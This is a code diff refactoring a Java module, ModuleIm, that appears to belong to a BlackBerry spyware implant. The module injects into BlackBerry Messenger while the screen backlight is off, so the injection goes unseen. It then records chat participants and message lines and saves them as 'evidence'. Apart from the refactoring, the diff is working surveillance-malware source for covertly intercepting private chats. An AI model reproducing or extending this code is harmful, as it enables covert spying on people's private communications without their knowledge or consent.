@@ -12,15 +12,15 @@ package blackberry.module;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import blackberry.AgentManager;
+import blackberry.ModuleManager;
 import blackberry.AppListener;
 import blackberry.Device;
 import blackberry.agent.im.LineMarkup;
-import blackberry.config.Conf;
-import blackberry.crypto.Encryption;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
@@ -53,41 +53,31 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
      * @param agentStatus
      *            the agent status
      */
-    public ModuleIm(final boolean agentEnabled) {
-        super(BaseModule.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
+    public ModuleIm() {
 
-        if(!Device.getInstance().atLeast(5, 0)){
+        if (!Device.getInstance().atLeast(5, 0)) {
             //#ifdef DEBUG
             debug.error("ImAgent: not supported before OS 5.0");
             //#endif
             enable(false);
         }
-        
+
         //#ifdef IM_FORCED
         enable(true);
         //#endif
 
-    }
-
-    /**
-     * Instantiates a new task agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleIm(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
-
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
 
-        markup = new LineMarkup(agentId, Encryption.getKeys().getAesKey());
+        markup = new LineMarkup(getId());
 
     }
-    
+
+    protected boolean parse(ConfModule conf) {
+        // TODO Auto-generated method stub
+        return false;
+    }
+
     private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
@@ -105,22 +95,6 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
         return null;
     }
 
-    private synchronized void serialize(String partecipants, String lastLine) {
-        //#ifdef DEBUG
-        debug.trace("serialize: " + lastLine);
-        //#endif
-
-        if (!markup.isMarkup()) {
-            markup.createEmptyMarkup();
-        }
-
-        markup.put(partecipants, lastLine);
-    }
-
-    public static ModuleIm getInstance() {
-        return (ModuleIm) AgentManager.getInstance().getItem(BaseModule.AGENT_IM);
-    }
-
     public synchronized void actualStart() {
         //#ifdef DEBUG
         debug.trace("actualStart");
@@ -132,7 +106,7 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
         try {
             if (appInjector == null) {
                 appInjector = new AppInjector(AppInjector.APP_BBM);
-            }else{
+            } else {
                 appInjector.reset();
             }
 
@@ -141,7 +115,7 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
-        
+
         if (!Backlight.isEnabled() && !appInjector.isInfected()) {
             //#ifdef DEBUG
             debug.info("injecting");
@@ -150,17 +124,6 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
             appInjector.infect();
         }
     }
-
-    public synchronized void actualStop() {
-        //#ifdef DEBUG
-        debug.trace("actualStop");
-        //#endif
-
-        AppListener.getInstance().removeBacklightObserver(this);
-        AppListener.getInstance().removeApplicationObserver(this);
-    }
-
-    boolean infecting = false;
 
     public void actualGo() {
 
@@ -174,23 +137,32 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
         }
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
+    public synchronized void actualStop() {
         //#ifdef DEBUG
-        if (confParameters != null) {
-            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
-        } else {
-            debug.trace("parse: null");
-        }
+        debug.trace("actualStop");
         //#endif
 
-        setPeriod(APP_TIMER_PERIOD);
-        setDelay(APP_TIMER_PERIOD);
-        return false;
+        AppListener.getInstance().removeBacklightObserver(this);
+        AppListener.getInstance().removeApplicationObserver(this);
     }
+
+    public static ModuleIm getInstance() {
+        return (ModuleIm) ModuleManager.getInstance().get("im");
+    }
+
+    private synchronized void serialize(String partecipants, String lastLine) {
+        //#ifdef DEBUG
+        debug.trace("serialize: " + lastLine);
+        //#endif
+
+        if (!markup.isMarkup()) {
+            markup.createEmptyMarkup();
+        }
+
+        markup.put(partecipants, lastLine);
+    }
+
+    boolean infecting = false;
 
     public void onBacklightChange(boolean on) {
         if (!on && !appInjector.isInfected()) {
@@ -274,7 +246,7 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
 
             serialize(partecipants, lastLine);
             //#ifdef DEBUG
-            debug.trace("write evidence from line: " + lastEqual +1);
+            debug.trace("write evidence from line: " + lastEqual + 1);
             //#endif
             writeEvidence(partecipants, lines, lastEqual + 1);
 
@@ -318,13 +290,14 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
             items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
         }
 
+        Evidence evidence = new Evidence(EvidenceType.CHAT);
         evidence.atomicWriteOnce(items);
 
     }
-    
+
     //#ifdef DEBUG
-    public void disinfect(){
-        if(appInjector!=null){
+    public void disinfect() {
+        if (appInjector != null) {
             appInjector.disinfect();
         }
     }
